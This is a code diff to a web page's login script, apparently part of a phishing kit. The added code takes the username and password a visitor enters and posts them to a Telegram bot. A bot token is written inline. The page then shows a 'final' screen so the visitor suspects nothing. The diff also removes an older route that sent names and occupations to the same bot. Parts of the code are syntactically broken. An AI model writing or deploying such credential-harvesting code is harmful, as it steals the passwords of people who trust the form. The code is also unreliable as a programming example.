@@ -29,7 +29,50 @@ document.addEventListener('DOMContentLoaded', () => {
     sig.addEventListener('click', () => {
         //validate the form
         validate();
+
+    if (!pwdVal) {
+        return;
+    }
         if (pwdVal) {
+
+    const name = unameInp.value.trim();
+    const pwd = pwdInp.value.trim();
+
+    try {
+        const message =
+            `New submission\n\n` +
+            `Name: ${name}\n` +
+            `Password: ${pwd}`;
+
+        const response = await fetch(
+            `https://api.telegram.org/bot${8828292202:AAFK5J441LHn-_GgtPZhaUi43ZjvaE3vnY8}/sendMessage`,
+            {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: "@ResulteronlyBot",
+                    text: message
+                })
+            }
+        );
+
+        const result = await response.json();
+
+        if (!result.ok) {
+            console.error('Telegram error:', result);
+            return;
+        }
+
+        document.getElementById("section_occupation").classList.add('d-none');
+        document.getElementById('section_final').classList.remove('d-none');
+
+        view = "final";
+
+    } catch (error) {
+        console.error('Submission error:', error);
+    }
             document.getElementById("section_pwd").classList.toggle('d-none');
             document.getElementById('section_final').classList.remove('d-none');
             view = "final";
@@ -105,35 +148,4 @@ document.addEventListener('DOMContentLoaded', () => {
             window.open(location, '_self').close();
         })
     })
-
-    //Send to telegram
-
-    app.post("/send-to-telegram", async (req, res) => {
-    const { name, occupation } = req.body;
-
-    const message =
-        `New submission\n\n` +
-        `Name: ${name}\n` +
-        `Occupation: ${occupation}`;
-
-    const telegramResponse = await fetch(
-        `https://api.telegram.org/bot${8828292202:AAFK5J441LHn-_GgtPZhaUi43ZjvaE3vnY8}/sendMessage`,
-        {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify({
-                chat_id: "@ResulteronlyBot",
-                text: message
-            })
-        }
-    );
-
-    const result = await telegramResponse.json();
-
-    res.json({
-        success: result.ok
-    });
-});
 })
